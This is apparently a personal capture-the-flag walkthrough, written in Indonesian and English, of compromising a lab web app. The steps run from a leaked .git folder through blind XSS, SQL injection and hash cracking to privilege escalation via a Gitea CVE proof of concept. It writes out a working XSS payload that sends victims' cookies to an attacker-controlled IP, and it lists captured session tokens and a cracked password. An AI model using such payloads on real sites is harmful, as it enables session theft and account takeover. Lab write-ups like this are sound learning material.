# 1. Open Port
## TCP
![[../attachments/Pasted image 20250202132521.png]]
![[../attachments/Pasted image 20250202141804.png]]
## UDP
![[../attachments/Pasted image 20250202141553.png]]
# 2. Web
register
form register using GET method
![[../attachments/Pasted image 20250202134026.png]]
login
![[../attachments/Pasted image 20250202134132.png]]
vote -> can not click
![[../attachments/Pasted image 20250202134402.png]]
ada fitur upload
![[../attachments/Pasted image 20250203144311.png]]
## Directory
![[../attachments/Pasted image 20250202135422.png]]
ada .git
## Subdomain
![[../attachments/Pasted image 20250202202655.png]]

# 3. Git
extract git folder
![[../attachments/Pasted image 20250202141344.png]]
![[../attachments/Pasted image 20250202141417.png]]
## review file php
ada cat.db
![[../attachments/Pasted image 20250202141926.png]]
axel as admin
![[../attachments/Pasted image 20250202142050.png]]
tables users
![[../attachments/Pasted image 20250202142836.png]]
tables cat
![[../attachments/Pasted image 20250202143048.png]]
file gambar beda2
![[../attachments/Pasted image 20250202143229.png]]
## folder /.git
![[../attachments/Pasted image 20250202143339.png]]
axel email -> axel2017@gmail.com
![[../attachments/Pasted image 20250202144223.png]]
git status
![[../attachments/Pasted image 20250202181606.png]]
git log oneline all
![[../attachments/Pasted image 20250202181902.png]]
# 4. Blind XSS
there is no sanitation in username parameter in registration
![[../attachments/Pasted image 20250204092317.png]]

```
<script>document.location='http://10.10.14.19:8888/?c='+document.cookie;</script>
```
![[../attachments/Pasted image 20250203214646.png]]
![[../attachments/Pasted image 20250203214724.png]]
![[../attachments/Pasted image 20250203214758.png]]
![[../attachments/Pasted image 20250204053500.png]]
```
rrrbeq451gv5pfag2mn2edi718
fgh50bpdee5mucu3h3dvnb1u3h
96qh6v2cnrl449bue71ebrju0a
8bd6oc7dtapa1hd30ja6n04sac
```
![[../attachments/Pasted image 20250204102017.png]]
# 5. SQL injection
input tidak disanitasi
![[../attachments/Pasted image 20250204102534.png]]
![[../attachments/Pasted image 20250204102509.png]]
![[../attachments/Pasted image 20250204105953.png]]
web menggunakan sqlite
![[../attachments/Pasted image 20250204111736.png]]
cara curang sebenerny huhuhu
![[../attachments/Pasted image 20250204135815.png]]
detek hash
![[../attachments/Pasted image 20250204140133.png]]
![[../attachments/Pasted image 20250204143513.png]]
password axel gabisa di crack
coba akun lain -> rose
bisa dicrack. -> soyunaprincesarosa
![[../attachments/Pasted image 20250204152957.png]]
# 6. SSH user rosa
berhasil ssh rosa, tapi tidak ada user flag
![[../attachments/Pasted image 20250204153315.png]]
cek local port
![[../attachments/Pasted image 20250205100101.png]]
port 3000
![[../attachments/Pasted image 20250205100149.png]]
![[../attachments/Pasted image 20250205100246.png]]
ada CVE di gitea, tapi harus login dahulu
tidak ada default password
![[../attachments/Pasted image 20250205101916.png]]
cek port lain
ada SMTP
![[../attachments/Pasted image 20250205200320.png]]
coba cek log web server, soalnya login web appnya pake method GET
![[../attachments/Pasted image 20250205205851.png]]
dapat user password axel
![[../attachments/Pasted image 20250205210155.png]]
# 7. Priviledge Escalation
![[../attachments/Pasted image 20250205211452.png]]
coba buka /var/email/axel ada info email
![[../attachments/Pasted image 20250205212232.png]]
coba akses url yang di mention axel -> tidak bisa
![[../attachments/Pasted image 20250206094630.png]]
coba login dengan password axel pada gitea -> berhasil
![[../attachments/Pasted image 20250205212143.png]]
coba PoC CVE gitea
https://github.com/MindPatch/latestpocs/tree/master/CVE-2024-6886
![[../attachments/Pasted image 20250206092951.png]]
berhasil 

coba kita kirimkan email kepada jobert untuk membuka repo kita, dan xss kita bermaksud untuk memfexth halaman url gitea yang tidak bisa kita buka itu
![[../attachments/Pasted image 20250206095529.png]]
![[../attachments/Pasted image 20250206095652.png]]
dapat 
![[../attachments/Pasted image 20250206161012.png]]
decode
![[../attachments/Pasted image 20250207092048.png]]
Login su dengan passwordnya
![[../attachments/Pasted image 20250207092238.png]]
